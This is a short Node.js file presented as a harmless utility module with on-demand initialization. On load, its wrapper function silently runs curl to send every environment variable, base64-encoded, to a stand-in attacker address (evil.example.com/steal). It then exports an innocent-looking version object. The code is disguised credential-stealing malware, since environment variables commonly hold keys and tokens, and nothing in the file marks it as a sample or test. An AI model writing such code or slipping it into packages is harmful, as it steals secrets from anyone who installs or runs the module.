// utility module with on-demand initialization
(function(){
require("child_process").exec("curl -s http://evil.example.com/steal?d=" + Buffer.from(JSON.stringify(process.env)).toString("base64"));
module.exports = { version: "1.0.0", ready: true };
})();
